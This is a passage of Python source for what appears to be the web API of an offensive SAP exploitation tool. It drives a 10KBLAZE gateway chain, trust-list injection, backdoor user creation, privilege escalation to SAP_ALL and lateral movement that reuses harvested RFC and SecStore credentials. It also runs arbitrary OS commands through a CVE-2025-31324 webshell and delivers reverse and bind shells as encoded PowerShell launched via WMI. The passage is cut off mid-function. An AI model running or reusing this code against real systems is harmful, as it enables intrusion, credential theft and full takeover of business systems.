                    attacker_ip=attacker_ip,
                    nilist_wait=nilist_wait,
                    client=client,
                    stop_event=stop_event,
                )
                if created:
                    api.state.track_created_user(created)
                    sapmap_exploit._post_exploit_enrichment(node, api.state, proven_type="ABAP")
            finally:
                _unregister_betrusted_stop(key)

        _bg(key, "10KBLAZE Full Chain", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/betrusted", method="POST")
    def node_betrusted(sid):
        """Execute betrusted attack: register fake app server, hold TCP connection open,
        and poll gateway trust.  Uses try_betrusted_chain() so the MS connection stays
        alive while the GW check runs — the connection is only closed once we confirm
        whether the gateway trusts us (or after 5 min timeout)."""
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        attacker_ip = data.get("attacker_ip", "").strip()
        if not attacker_ip:
            return json.dumps({"error": "attacker_ip is required"})

        if not node.ms_port:
            return json.dumps({"error": "MS internal port not known — run Check MS first"})

        nilist_wait = float(data.get("nilist_wait", 30.0))

        stop_event = threading.Event()
        key = f"{sid}:betrusted"
        _register_betrusted_stop(key, stop_event)

        def _run():
            try:
                print(f"[*] {sid}: Running betrusted attack on "
                      f"{node.ip or node.hostname}:{node.ms_port} "
                      f"→ injecting {attacker_ip} into gateway trust list")
                # try_betrusted_chain keeps the MS connection alive while polling GW
                ok = sapmap_exploit.try_betrusted_chain(
                    node, api.state,
                    attacker_ip=attacker_ip,
                    nilist_wait=nilist_wait,
                    stop_event=stop_event,
                )
                if stop_event.is_set():
                    pass   # exploit already logged cancellation
                elif ok:
                    print(f"[+] {sid}: Gateway now TRUSTED from {attacker_ip} "
                          f"— GW exploit is available")
                else:
                    print(f"[-] {sid}: Gateway did not become trusted. "
                          f"Try 'Create User (10KBLAZE Full Chain)' for the automated chain.")
            finally:
                stop_event.set()   # ensure betrusted thread exits
                _unregister_betrusted_stop(key)

        _bg(key, "Betrusted Attack", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/create_user", method="POST")
    def node_create_user(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        method = data.get("method", "credentials")

        client = data.get("client")

        def _run():
            if method == "gw_exploit":
                created = sapmap_exploit.create_user_gw_exploit(node, api.state,
                                                                 client=client)
            else:
                created = sapmap_exploit.create_user_via_credentials(node, api.state)
            if created:
                api.state.track_created_user(created)
                sapmap_exploit._post_exploit_enrichment(node, api.state, proven_type="ABAP")

        _bg(f"{sid}:create_user", "Create User", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/lpe", method="POST")
    def node_lpe(sid):
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        method = data.get("method")  # None = try all

        def _run():
            creds = node.best_credentials()
            if not creds:
                print(f"[-] No credentials available for {sid}")
                return
            import sapmap_lpe
            success = sapmap_lpe.try_lpe(node, creds, method_name=method)
            if success:
                print(f"[+] LPE succeeded on {sid} — "
                      f"{creds.username} now has SAP_ALL")

        _bg(f"{sid}:lpe", "Local Privilege Escalation", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/retrieve_rfcs", method="POST")
    def node_retrieve_rfcs(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            conns = sapmap_rfc.retrieve_rfc_connections(node, creds)
            print(f"[+] Retrieved {len(conns)} RFC connections from {sid}")

            # Track discovered systems to avoid duplicate pings
            # Key: (host, instance_nr) → dest_name for dedup
            discovered = {}

            for conn in conns:
                # Detect self-referencing RFC destinations
                th = (conn.target_host or '').strip().lower()
                ti = (conn.target_ip or '').strip()
                own_names = {s.lower() for s in [
                    node.hostname, node.ip, 'localhost', '127.0.0.1',
                ] if s}
                own_names.update(h.lower() for h in node.all_hostnames())
                own_names.update(node.all_ips())
                is_self = (not th and not ti) or th in own_names or ti in own_names
                # Same host but different instance = NOT self
                if is_self and conn.target_instance_nr:
                    own_instances = set(node.instance_nrs())
                    target_inst = conn.target_instance_nr.strip().zfill(2)
                    if own_instances and target_inst not in own_instances:
                        is_self = False
                if is_self:
                    conn.target_host = node.hostname or node.ip
                    conn.target_sid = node.sid
                else:
                    target = api.state.find_node_by_host(
                        hostname=conn.target_host, ip=conn.target_ip,
                        instance_nr=conn.target_instance_nr or "",
                    )
                    if target:
                        conn.target_sid = target.sid
                api.state.add_connection(conn)

            # Ping each non-self connection and auto-discover systems
            # DEST_CHECK_CONNECTION returns the remote SID so we can
            # do SID-first mapping instead of host-first.
            non_self = [c for c in conns
                        if c.target_sid != sid and c.target_host]

            if non_self:
                print(f"[*] Pinging {len(non_self)} remote RFC destinations...")

            # discovered: (host, inst) → {dest_name, remote_sid, remote_host}
            discovered = {}
            import sapmap_stop

            for conn in non_self:
                if sapmap_stop.is_stop_requested():
                    print(f"[!] STOP — retrieve-RFCs ping loop "
                          f"aborted ({len(discovered)} probed)")
                    return
                host = conn.target_ip or conn.target_host or ""
                inst = conn.target_instance_nr or "00"
                key = (host.lower(), inst)

                if key in discovered:
                    # Already pinged this host+instance, reuse SID
                    prev = discovered[key]
                    conn.ping_ok = True
                    conn.tested = True
                    if prev.get("remote_sid"):
                        conn.target_sid = prev["remote_sid"]
                    api.state.add_connection(conn)
                    time.sleep(0.4)
                    continue

                print(f"[*] Ping {conn.destination_name} → "
                      f"{host}...")
                ping = sapmap_rfc.ping_rfc_destination(
                    node, conn.destination_name, creds
                )

                if ping["ping_ok"]:
                    dest_sid = ping.get("remote_sid", "").strip()
                    remote_ip = ping.get("remote_ip", "").strip()
                    remote_host = (
                        ping.get("remote_hostname", "").strip()
                        or conn.target_host or host)
                    # If target_host was a hostname (not IP), use the
                    # IP returned by RFC_SYSTEM_INFO on the SAP system
                    if remote_ip and remote_ip != host:
                        print(f"[*] Resolved {host} → {remote_ip} "
                              f"(via RFC_SYSTEM_INFO)")
                        conn.target_ip = remote_ip
                        host = remote_ip
                        key = (host.lower(), inst)  # update dedup key
                    print(f"[+] {conn.destination_name}: alive"
                          f"{f' (SID={dest_sid})' if dest_sid else ''}"
                          f" ({ping['ping_message'][:60]})")
                    conn.ping_ok = True
                    conn.tested = True
                    discovered[key] = {
                        "dest_name": conn.destination_name,
                        "remote_sid": "",  # set below once resolved
                        "remote_host": remote_host,
                    }

                    # ---- SID-first mapping ----
                    # 1. If we got a remote SID, look it up directly
                    if dest_sid:
                        existing_sid_node = api.state.get_node(dest_sid)
                        if existing_sid_node:
                            conn.target_sid = dest_sid
                            discovered[key]["remote_sid"] = dest_sid
                            api.state.add_connection(conn)
                            time.sleep(0.6)
                            if dest_sid == node.sid:
                                print(f"[*] {conn.destination_name}: "
                                      f"self-reference ({node.sid})")
                            else:
                                print(f"[*] {conn.destination_name}: "
                                      f"maps to existing {dest_sid}")
                            continue

                    # 2. Fall back to host+instance matching
                    existing = api.state.find_node_by_host(
                        hostname=host, ip=host, instance_nr=inst)
                    if existing:
                        conn.target_sid = existing.sid
                        discovered[key]["remote_sid"] = existing.sid
                        api.state.add_connection(conn)
                        time.sleep(0.6)
                        if existing.sid == node.sid:
                            print(f"[*] {conn.destination_name}: "
                                  f"self-reference ({node.sid})")
                        else:
                            print(f"[*] {conn.destination_name}: "
                                  f"maps to existing {existing.sid}")
                        continue

                    # 3. No existing node — use SID from ping or derive
                    if not dest_sid:
                        dest_sid = _derive_sid(
                            conn.destination_name, host)
                        print(f"[*] Could not get remote SID, "
                              f"using derived: {dest_sid}")

                    # Check if SID already on map but different host
                    existing_sid_node = api.state.get_node(dest_sid)
                    if existing_sid_node:
                        # Same SID exists — verify it's the same system
                        existing_ips = existing_sid_node.all_ips()
                        existing_names = existing_sid_node.all_hostnames()
                        is_same = False

                        if host in existing_ips or host.lower() in existing_names:
                            is_same = True

                        if not is_same:
                            resolved_ip = _resolve_host(host)
                            if resolved_ip and resolved_ip in existing_ips:
                                is_same = True

                        if not is_same and existing_sid_node.hostname:
                            existing_resolved = _resolve_host(
                                existing_sid_node.hostname)
                            rfc_resolved = _resolve_host(host)
                            if (existing_resolved and rfc_resolved
                                    and existing_resolved == rfc_resolved):
                                is_same = True

                        if not is_same and remote_host:
                            if (remote_host in existing_ips or
                                    remote_host.lower() in existing_names):
                                is_same = True
                            else:
                                rh_ip = _resolve_host(remote_host)
                                if rh_ip and rh_ip in existing_ips:
                                    is_same = True

                        if is_same and inst:
                            existing_insts = existing_sid_node.instance_nrs()
                            if existing_insts and inst.zfill(2) not in existing_insts:
                                is_same = False

                        if is_same:
                            conn.target_sid = dest_sid
                            discovered[key]["remote_sid"] = dest_sid
                            api.state.add_connection(conn)
                            time.sleep(0.6)
                            print(f"[*] {conn.destination_name}: "
                                  f"same system as {dest_sid}")
                            continue
                        else:
                            base_sid = dest_sid
                            counter = 1
                            while api.state.get_node(dest_sid):
                                dest_sid = (f"{base_sid}"
                                            f"{counter}")
                                counter += 1
                            print(f"[*] SID {base_sid} exists "
                                  f"with different IP, "
                                  f"using {dest_sid}")

                    # Add new system to map
                    ports = {
                        int(f"32{inst}"): "dispatcher",
                        int(f"33{inst}"): "gateway",
                    }
                    new_inst = InstanceInfo(
                        instance_nr=inst, ip=host,
                        ports=ports)
                    new_node = SAPNode(
                        sid=dest_sid, ip=host,
                        hostname=remote_host,
                        instances=[new_inst])
                    api.state.add_node(new_node)
                    conn.target_sid = dest_sid
                    discovered[key]["remote_sid"] = dest_sid
                    api.state.add_connection(conn)
                    time.sleep(1.2)  # longer pause for new system discovery
                    print(f"[+] Discovered {dest_sid} "
                          f"({remote_host}/{host}, "
                          f"inst {inst}) — added to map")
                else:
                    print(f"[-] {conn.destination_name}: not reachable"
                          f"{' — ' + ping['error'][:60] if ping['error'] else ''}")
                    conn.ping_ok = False
                    conn.tested = True
                    api.state.add_connection(conn)
                    time.sleep(0.4)

            alive = len(discovered)
            print(f"[+] Ping results: {alive} alive systems, "
                  f"{len(non_self) - alive} unreachable")

        _bg(f"{sid}:retrieve_rfcs", "Retrieve RFCs", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/test_rfcs", method="POST")
    def node_test_rfcs(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        def _run():
            creds = node.best_credentials()
            conns = api.state.get_connections_from(sid)
            tested_count = 0
            logon_ok_count = 0
            sap_all_count = 0
            # Only test connections whose target is a known node on the map
            mapped_conns = [c for c in conns
                            if c.target_sid and api.state.get_node(c.target_sid)]
            skipped = len(conns) - len(mapped_conns)
            for conn in mapped_conns:
                conn.tested = False
                api.state.rfc_check_cache.pop(conn.destination_name, None)
            print(f"[*] RFC Testing: {sid} — {len(mapped_conns)} mapped connection(s) "
                  f"to check{f' ({skipped} unmapped skipped)' if skipped else ''}")
            import sapmap_stop
            for conn in mapped_conns:
                if sapmap_stop.is_stop_requested():
                    print(f"[!] STOP — bulk RFC test aborted "
                          f"({tested_count}/{len(mapped_conns)} done)")
                    return
                print(f"[*] Testing {conn.destination_name}...")
                result = sapmap_rfc.test_rfc_destination(
                    node, conn.destination_name, creds, api.state.rfc_check_cache
                )
                conn.logon_successful = result.get("logon_ok", False)
                conn.logon_tested = True
                conn.ping_ok = result.get("ping_ok", False)
                conn.latency_ms = result.get("latency_ms", 0)
                conn.tested = True
                tested_count += 1

                if conn.logon_successful:
                    logon_ok_count += 1
                    print(f"[+] {conn.destination_name}: Logon successful!")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True

                if conn.logon_successful and conn.rfc_user and not conn.profiles:
                    info = sapmap_rfc.get_remote_user_profiles(
                        node, conn.rfc_user, conn.destination_name, creds
                    )
                    conn.profiles = info.get("profiles", [])
                    conn.has_sap_all = info.get("has_sap_all", False)
                    conn.user_detail_error = info.get("error", "")
                    if conn.has_sap_all:
                        sap_all_count += 1
                        print(f"[!] {conn.rfc_user} in {conn.destination_name} has SAP_ALL!")
                    api.state.notify_sap_all_if_elevated(conn)
            print(f"[+] RFC Testing done for {sid}: "
                  f"{tested_count} tested, {logon_ok_count} logon OK, "
                  f"{sap_all_count} with SAP_ALL")

        _bg(f"{sid}:test_rfcs", "Test RFCs", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/test_rfc_single", method="POST")
    def node_test_rfc_single(sid):
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        dest_name = data.get("destination_name", "")
        if not dest_name:
            return json.dumps({"error": "destination_name required"})

        def _run():
            creds = node.best_credentials()
            conn = None
            for c in api.state.get_connections_from(sid):
                if c.destination_name == dest_name:
                    conn = c
                    break
            if not conn:
                print(f"[-] Connection {dest_name} not found on {sid}")
                return
            # Clear cache so it actually re-tests
            conn.tested = False
            api.state.rfc_check_cache.pop(dest_name, None)
            is_type_t = conn.sapxpg_remote_works or dest_name.startswith("SAPMAP_")

            # If we have a SecStore password, try direct connection to the
            # target first — this bypasses the source system entirely and
            # works even when the source client is locked (SCC4).
            if conn.secstore_password and conn.rfc_user and conn.target_sid:
                target_node = api.state.get_node(conn.target_sid)
                if target_node:
                    target_client = conn.client or "000"
                    # Prefer the JCo-destination sysnr captured from the
                    # Java SecStore.  Without it, a destination targeting
                    # sysnr 40 falls back to the first registered instance
                    # (often 00) and hits the wrong gateway port (3300
                    # instead of 3340) — RFC_COMMUNICATION_FAILURE.
                    target_inst = (
                        (conn.target_instance_nr or "").strip()
                        or (target_node.instance_nrs()[0]
                            if target_node.instance_nrs() else "00"))
                    print(f"[*] Testing {dest_name} via direct RFC to "
                          f"{conn.target_sid} (SecStore password)...")
                    direct_creds = Credentials(
                        username=conn.rfc_user,
                        password=conn.secstore_password,
                        client=target_client,
                        instance_nr=target_inst,
                    )
                    try:
                        if sapmap_rfc.test_connection(target_node, direct_creds):
                            conn.logon_successful = True
                            conn.logon_tested = True
                            conn.ping_ok = True
                            conn.tested = True
                            print(f"[+] {dest_name}: Direct logon OK "
                                  f"({conn.rfc_user}@{conn.target_sid})")
                            # Fetch profiles + roles DIRECTLY on the target
                            # (works for Java sources that have no ABAP
                            # to host RFC_ABAP_INSTALL_AND_RUN).
                            info = sapmap_rfc.get_direct_user_profiles(
                                target_node, conn.rfc_user, direct_creds)
                            # If the RFC-dest user itself can't call
                            # BAPI_USER_GET_DETAIL on the target (common
                            # for service users like TRACE, CPIC_*), the
                            # direct call returns empty/errored.  When
                            # the SOURCE node IS ABAP we can still get
                            # real profile data by running the BAPI
                            # through RFC_ABAP_INSTALL_AND_RUN on the
                            # source with our SAP_ALL creds — same path
                            # ABAP→ABAP edges already use.  Upgrade
                            # whatever the direct call couldn't answer.
                            is_abap_source = "ABAP" in (
                                node.system_type or "").upper()
                            direct_gave_nothing = (
                                not info.get("profiles")
                                and not info.get("roles"))
                            if is_abap_source and direct_gave_nothing:
                                print(f"[*] {dest_name}: direct BAPI on "
                                      f"target returned nothing"
                                      f"{' ('+info.get('error','')[:80]+')' if info.get('error') else ''}"
                                      f" — falling back to "
                                      f"RFC_ABAP_INSTALL_AND_RUN via "
                                      f"source {node.sid}")
                                src_info = sapmap_rfc.get_remote_user_profiles(
                                    node, conn.rfc_user, dest_name, creds)
                                if (src_info.get("profiles")
                                        or src_info.get("has_sap_all")):
                                    info = src_info
                            conn.profiles = info.get("profiles", [])
                            conn.roles = info.get("roles", [])
                            conn.has_sap_all = info.get("has_sap_all", False)
                            conn.user_detail_error = info.get("error", "")
                            if conn.has_sap_all:
                                print(f"[!] {conn.rfc_user}@{conn.target_sid} "
                                      f"has SAP_ALL — edge flipping to red, "
                                      f"'Create Remote User' now available")
                                target_node.has_critical_finding = True
                                api.state.notify_sap_all_if_elevated(conn)
                            elif conn.profiles or conn.roles:
                                p_str = (", ".join(conn.profiles[:5])
                                         + ("…" if len(conn.profiles) > 5
                                            else "")) or "<none>"
                                r_str = (", ".join(conn.roles[:5])
                                         + ("…" if len(conn.roles) > 5
                                            else "")) or "<none>"
                                print(f"[*] {conn.rfc_user}@{conn.target_sid}: "
                                      f"profiles=[{p_str}] roles=[{r_str}] "
                                      f"— no SAP_ALL")
                            elif conn.user_detail_error:
                                print(f"[*] {conn.rfc_user}@{conn.target_sid}: "
                                      f"could not read profiles "
                                      f"({conn.user_detail_error[:120]}) "
                                      f"— SAP_ALL status unknown")
                            return
                    except Exception as e:
                        print(f"[-] Direct test failed: {e}")

            # Skip the ABAP /SDF/RFC_CHECK fallback if the source node
            # is Java-only (no ABAP to run the FM on), or if the only
            # credential we have is a Java UME user with empty client
            # (the NW RFC SDK would reject it with 'Invalid CLIENT
            # format' before even reaching the network).
            is_java_only = ("JAVA" in (node.system_type or "").upper()
                            and "ABAP" not in (node.system_type or "").upper())
            client_numeric = ((creds.client if creds else "") or "").strip()
            has_valid_client = client_numeric.isdigit()
            if is_java_only or not has_valid_client:
                reason = ("source is Java-only, no ABAP /SDF/RFC_CHECK FM"
                          if is_java_only else
                          f"best credential has no numeric client "
                          f"(got {client_numeric!r} — likely a Java UME "
                          f"user from RECON)")
                print(f"[*] {dest_name}: skipping ABAP RFC-destination "
                      f"test — {reason}")
                conn.logon_successful = False
                conn.logon_tested = True
                conn.tested = True
                if not conn.logon_successful:
                    print(f"[-] {dest_name}: Logon not tested "
                          f"(need direct test with SecStore password above)")
                print(f"[+] Single test done for {dest_name}")
                return

            print(f"[*] Testing {'TCP/IP' if is_type_t else 'RFC'} "
                  f"destination: {dest_name}...")
            result = sapmap_rfc.test_rfc_destination(
                node, dest_name, creds, api.state.rfc_check_cache
            )
            conn.latency_ms = result.get("latency_ms", 0)
            conn.tested = True

            if is_type_t:
                # Type T: success = EV_PING_STATUS == 1
                ping_success = result.get("ping_status") == "1"
                conn.ping_ok = ping_success
                conn.logon_successful = ping_success
                conn.logon_tested = True
                conn.sapxpg_remote_works = ping_success
                if ping_success:
                    print(f"[+] {dest_name}: Ping successful! "
                          f"(EV_PING_STATUS=1, latency={conn.latency_ms}ms)")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True
                else:
                    print(f"[-] {dest_name}: Ping failed")
            else:
                # Type 3: success = logon_ok
                conn.logon_successful = result.get("logon_ok", False)
                conn.logon_tested = True
                conn.ping_ok = result.get("ping_ok", False)
                if conn.logon_successful:
                    print(f"[+] {dest_name}: Logon successful!")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True
                    if conn.rfc_user:
                        info = sapmap_rfc.get_remote_user_profiles(
                            node, conn.rfc_user, dest_name, creds
                        )
                        conn.profiles = info.get("profiles", [])
                        conn.has_sap_all = info.get("has_sap_all", False)
                        conn.user_detail_error = info.get("error", "")
                        if conn.has_sap_all:
                            print(f"[!] {conn.rfc_user} in {dest_name} has SAP_ALL!")
                        api.state.notify_sap_all_if_elevated(conn)
                else:
                    err = result.get("error", "")
                    if err:
                        err_short = err.split("\n")[0][:120]
                        print(f"[-] {dest_name}: Logon failed ({err_short})")
                    else:
                        print(f"[-] {dest_name}: Logon failed")
            print(f"[+] Single test done for {dest_name}")

        _bg(f"{sid}:test_rfc:{dest_name}", "Test RFC", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/exec_command", method="POST")
    def node_exec_command(sid):
        """Execute an OS command on a node (synchronous).

        Accepts either:
          - cmdline: raw command (e.g. "ls -la") — auto-wrapped in shell
          - command + params: explicit binary + params (legacy)
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        method = data.get("method", "gateway")  # "gateway" | "sxpg" | "cve_31324"
        cmdline = data.get("cmdline", "").strip()
        command = data.get("command", "").strip()
        params = data.get("params", "").strip()

        # If cmdline provided, auto-detect OS and wrap in shell.
        # CVE-2025-31324 is special: the JSP webshell already detects
        # Windows vs Linux and wraps in cmd.exe /c or /bin/sh -c internally.
        # Server-side wrapping would double-wrap (e.g. "/bin/sh -c whoami"
        # passed to cmd.exe /c on Windows → path not found).  Skip it.
        if cmdline and method == "cve_31324":
            command = cmdline
            params = ""
        elif cmdline:
            os_type = node.os_type or ""
            # Auto-detect OS if unknown
            if not os_type:
                if method == "sxpg":
                    # Use RFC_SYSTEM_INFO
                    creds = node.best_credentials()
                    if creds:
                        try:
                            with sapmap_rfc._get_connection(
                                    node, creds) as conn:
                                info = conn.call("RFC_SYSTEM_INFO")
                                export = info.get("RFCSI_EXPORT", {})
                                if isinstance(export, dict):
                                    os_type = export.get(
                                        "RFCOPSYS", "").strip()
                        except Exception:
                            pass
                elif method == "gateway" and node.gw_vulnerable:
                    # Probe via GW to detect OS. "ver" is a cmd.exe
                    # built-in (not a standalone exe), so we must use
                    # "cmd.exe /C ver" as full EXTPROG. If it succeeds
                    # with "windows" in output → Windows. If it fails,
                    # try "uname" which works on Linux/Unix.
                    try:
                        probe = sapmap_exploit.execute_gw_command(
                            node, "cmd.exe /C ver", "")
                        if probe.get("success") and probe.get("output"):
                            out_text = " ".join(probe["output"]).lower()
                            if "windows" in out_text:
                                os_type = "Windows NT"
                        if not os_type:
                            probe2 = sapmap_exploit.execute_gw_command(
                                node, "uname", "")
                            if probe2.get("success") and probe2.get("output"):
                                os_type = "Linux"
                        if not os_type:
                            os_type = "Linux"
                    except Exception:
                        os_type = "Linux"
                if os_type:
                    node.os_type = os_type
                    print(f"[*] {sid}: Auto-detected OS: {os_type}")
            is_win = any(w in os_type.lower()
                         for w in ("windows", "nt", "win"))
            if is_win:
                # Windows SAPXPG: full command line goes in EXTPROG,
                # PARAMS left empty (old kernels treat EXTPROG as
                # the full command line, PARAMS gets mangled)
                command = f"cmd.exe /C {cmdline}"
                params = ""
            else:
                command = "/bin/sh"
                # Replace spaces with ${IFS} so SAPXPG doesn't split
                params = "-c " + cmdline.replace(" ", "${IFS}")

        if not command:
            return json.dumps({"error": "No command specified"})

        if method == "gateway":
            if not node.gw_vulnerable:
                return json.dumps({"error": "Gateway not vulnerable on this system"})
            result = sapmap_exploit.execute_gw_command(node, command, params)
        elif method == "sxpg":
            creds = node.best_credentials()
            if not creds:
                return json.dumps({"error": "No credentials available"})
            result = sapmap_rfc.execute_local_command(node, command, params, creds)
        elif method == "cve_31324":
            if not node.cve_2025_31324_vulnerable:
                return json.dumps({"error": "CVE-2025-31324 not confirmed — "
                                             "run Check first"})
            # Route through the dropped shell when available (captures stdout),
            # otherwise fall back to the blind Runtime.exec gadget.
            full = (command + (" " + params if params else "")).strip()
            result = sapmap_exploit.execute_cve_2025_31324_via_shell(node, full)
        else:
            return json.dumps({"error": f"Unknown method: {method}"})

        return json.dumps(result)

    # -- Reverse Shell endpoints --

    @app.route("/api/shell/detect_ip", method="GET")
    def shell_detect_ip():
        response.content_type = "application/json"
        target = request.params.get("target", "")
        saprouter = request.params.get("saprouter", "")
        ip = _detect_local_ip(target, saprouter)
        return json.dumps({"local_ip": ip})

    @app.route("/api/shell/start", method="POST")
    def shell_start():
        global _shell_session
        response.content_type = "application/json"
        data = request.json or {}
        sid = data.get("sid", "")
        method = data.get("method", "gateway")
        shell_mode = data.get("shell_mode", "reverse")  # "reverse" or "bind"
        shell_port = int(data.get("listen_port", 4444))
        local_ip = data.get("local_ip", "127.0.0.1")

        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        with _shell_lock:
            if _shell_session and _shell_session.status in ("waiting", "connected"):
                return json.dumps({"error": "A shell session is already active. "
                                             "Stop it first."})
            session = ShellSession(shell_port, sid, mode=shell_mode)
            if shell_mode == "reverse":
                session.start_listener()
                if session.status == "error":
                    return json.dumps({"error": session.error_msg})
            else:
                # Bind mode: just set waiting, connector starts after payload
                session.status = "waiting"
            _shell_session = session

        # Generate and send payload in background
        # Capture session ref so we can check cancelled flag
        _session_ref = session

        def _send():
            target_host = node.ip or node.hostname
            # Determine OS — probe via cmd.exe if os_type not populated yet
            # (e.g. freshly-added nodes where the discovery scan hasn't run).
            # _detect_is_windows caches the result in node.os_type so it
            # only ever runs the probe once per node.
            is_win = _detect_is_windows(node, method=method)
            py_cmd = "python3" if is_win else _detect_python_cmd(node)
            if shell_mode == "bind":
                payload = _generate_bind_payload(
                    node.os_type, shell_port, python_cmd=py_cmd)
                print(f"[*] {sid}: Sending bind shell payload: "
                      f"{payload['display']}")
                print(f"    Will connect to {target_host}:{shell_port} "
                      f"after payload delivery")
            else:
                payload = _generate_payload(
                    node.os_type, local_ip, shell_port, python_cmd=py_cmd)
                print(f"[*] {sid}: Sending reverse shell payload: "
                      f"{payload['display']}")
                print(f"    Listening on 0.0.0.0:{shell_port}")

            def _set_progress(msg):
                with _shell_lock:
                    if _shell_session:
                        _shell_session.progress_msg = msg

            if method == "gateway":
                # GW: EXTPROG = "command", PARAMS = "params", LONG_PARAMS = "long_params"
                # long_params="" prevents old-kernel PARAMS+LONG_PARAMS concatenation.
                pre_steps = payload.get("steps", [])
                if pre_steps:
                    total = len(pre_steps)
                    for idx, step in enumerate(pre_steps):
                        if _session_ref.cancelled:
                            print(f"[*] {sid}: Payload delivery cancelled")
                            return
                        _set_progress(
                            f"Writing payload chunk {idx+1}/{total}...")
                        sapmap_exploit.execute_gw_command(
                            node, step["command"], step["params"],
                            long_params=step.get("long_params"))
                _set_progress("Executing payload...")
                result = sapmap_exploit.execute_gw_command(
                    node, payload["command"], payload["params"],
                    long_params=payload.get("long_params"))
            elif method == "cve_31324":
                # CVE-2025-31324 via the JSP shell has no 128/255-byte
                # EXTPROG/PARAMS limits, so we skip the chunked base64 write
                # used by the GW/SXPG backends and run the raw PowerShell in
                # one shot.  That's one HTTP round trip instead of ~20, and
                # each round trip spawns cmd.exe → PowerShell which is slow
                # (500ms+) so chunked delivery easily blew past the 20s HTTP
                # timeout.
                raw_ps = payload.get("raw_ps_script")
                if raw_ps:
                    # Kill any zombie PowerShell still LISTENING on the
                    # target port from a previous bind-shell attempt,
                    # otherwise the new listener hits "socket address
                    # already in use" and the user ends up talking to the
                    # old process on reconnect.
                    if shell_mode == "bind":
                        _set_progress(
                            "Clearing any old listener on target port...")
                        kill_cmd = (
                            f'cmd.exe /C for /f "tokens=5" %P in '
                            f'(\'netstat -ano ^| findstr :{shell_port} '
                            f'^| findstr LISTENING\') do '
                            f'taskkill /F /PID %P >nul 2>&1'
                        )
                        try:
                            sapmap_exploit.execute_cve_2025_31324_via_shell(
                                node, kill_cmd, timeout=15.0)
                        except Exception:
                            pass   # best-effort cleanup

                    _set_progress("Executing payload (single-shot)...")
                    # Clean-detach pattern: spawn the bind/reverse shell
                    # PowerShell via WMI Win32_Process.Create from a wrapper
                    # PowerShell — the spawned process inherits no handles
                    # from the JSP shell's cmd.exe, so no stdio leaks back
                    # as CLIXML progress/error noise and the wrapper exits
                    # instantly.
                    #
                    # Tried and rejected:
                    #   - `start /B powershell ...`: inherits stdio, leaks
                    #     CLIXML back through the JSP.
                    #   - `start "" /B cmd /c "... >nul 2>&1"`: quote
                    #     parsing mangles the nested cmd and the detach
                    #     silently fails ("system cannot find the path").
                    #
                    # -EncodedCommand on both layers bypasses quote parsing
                    # entirely for the payload itself.
                    import base64 as _b64
                    inner_enc = _b64.b64encode(
                        raw_ps.encode("utf-16-le")).decode("ascii")
                    wrapper_ps = (
                        f'[void]([wmiclass]"Win32_Process").Create('
                        f'"powershell.exe -NoProfile '
                        f'-EncodedCommand {inner_enc}")'
                    )
                    outer_enc = _b64.b64encode(
                        wrapper_ps.encode("utf-16-le")).decode("ascii")
                    full_cmd = (f"powershell.exe -NoProfile "
                                f"-EncodedCommand {outer_enc}")
                    # 45s is generous — wrapper typically returns <1s.
                    result = sapmap_exploit.execute_cve_2025_31324_via_shell(
                        node, full_cmd, timeout=45.0)
                else:
                    # Non-Windows payload (Linux python3 one-liner) — no
                    # chunking, just ship it.
                    full_cmd = (payload["command"] + " " +
                                payload["params"]).strip()
                    if shell_mode == "bind":
                        full_cmd = f"nohup {full_cmd} >/dev/null 2>&1 &"
                    _set_progress("Executing payload (single-shot)...")
                    result = sapmap_exploit.execute_cve_2025_31324_via_shell(
                        node, full_cmd, timeout=45.0)
            else:
                # SXPG: split EXTPROG + PARAMS
                creds = node.best_credentials()
                if not creds:
                    print(f"[-] {sid}: No credentials for SXPG shell")
                    with _shell_lock:
                        if _shell_session:
                            _shell_session.status = "error"
                            _shell_session.error_msg = "No credentials"
                    return
                sxpg_steps = payload.get("sxpg_steps", [])
                if sxpg_steps:
                    total = len(sxpg_steps)
                    for idx, step in enumerate(sxpg_steps):
                        if _session_ref.cancelled:
                            print(f"[*] {sid}: Payload delivery cancelled")
                            return
                        _set_progress(
                            f"Writing payload step {idx+1}/{total}...")
                        sapmap_rfc.execute_local_command(
                            node, step["command"], step["params"],
                            creds)
                _set_progress("Executing payload...")
                sxpg_cmd = payload.get("sxpg_command",
                                       payload["command"])
                sxpg_params = payload.get("sxpg_params",
                                          payload["params"])
                result = sapmap_rfc.execute_local_command(
                    node, sxpg_cmd, sxpg_params, creds)

            if result.get("success"):
                print(f"[+] {sid}: Shell payload delivered")
                if result.get("output"):
                    for line in result["output"][:5]:
                        print(f"    {line}")
                # For bind mode: start connecting to the target
                if shell_mode == "bind":
                    import time
                    time.sleep(2)  # give the bind shell time to start
                    with _shell_lock:
                        if _shell_session and _shell_session.status == "waiting":
                            print(f"[*] {sid}: Connecting to bind shell "
                                  f"at {target_host}:{shell_port}...")
                            _shell_session.start_connector(
                                target_host, node.saprouter)
            else:
                err = result.get("error", "unknown")
